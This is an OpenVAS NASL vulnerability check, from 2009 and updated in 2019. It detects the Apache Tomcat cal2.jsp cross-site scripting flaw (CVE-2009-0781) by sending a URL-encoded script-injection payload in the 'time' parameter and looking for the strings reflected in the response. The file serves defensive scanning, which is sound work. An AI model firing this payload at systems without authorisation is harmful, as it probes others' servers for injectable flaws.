###############################################################################
# OpenVAS Vulnerability Test
#
# Apache Tomcat cal2.jsp Cross Site Scripting Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:apache:tomcat";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800372");
  script_version("2019-05-10T11:41:35+0000");
  script_tag(name:"last_modification", value:"2019-05-10 11:41:35 +0000 (Fri, 10 May 2019)");
  script_tag(name:"creation_date", value:"2009-03-18 14:25:01 +0100 (Wed, 18 Mar 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2009-0781");
  script_name("Apache Tomcat cal2.jsp Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_tomcat_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/tomcat/http/detected");

  script_xref(name:"URL", value:"http://www.packetstormsecurity.org/0903-exploits/CVE-2009-0781.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/501538/100/0/threaded");
  script_xref(name:"URL", value:"http://tomcat.apache.org/security-6.html");
  script_xref(name:"URL", value:"http://tomcat.apache.org/security-5.html");
  script_xref(name:"URL", value:"http://tomcat.apache.org/security-4.html");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject arbitrary HTML
  codes in the context of the affected web application.");

  script_tag(name:"affected", value:"Apache Tomcat version 4.1.0 to 4.1.39, 5.0.0 to 5.0.28, 5.5.0 to 5.5.27 and 6.0.0 to 6.0.18");

  script_tag(name:"insight", value:"The issue is due to input validation error in time parameter in
  'jsp/cal/cal2.jsp' file in calendar application.");

  script_tag(name:"solution", value:"Update your Apache Tomcat to a non-affected version.");

  script_tag(name:"summary", value:"This host is running Apache Tomcat and is prone to Cross Site Scripting
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

# XSS attack string test in 'time' parameter inside cal2.jsp page
url = string( "/jsp-examples/cal/cal2.jsp?time=%74%65%73%74%3C%73%63%72%69"+
              "%70%74%3E%61%6C%65%72%74%28%22%61%74%74%61%63%6B%22%29%3B%3C" +
              "%2F%73%63%72%69%70%74%3E" );

req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ! res || res  !~ "^HTTP/1\.[01] 200" )
  exit( 0 );

if( "test" >< res && "attack" >< res ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );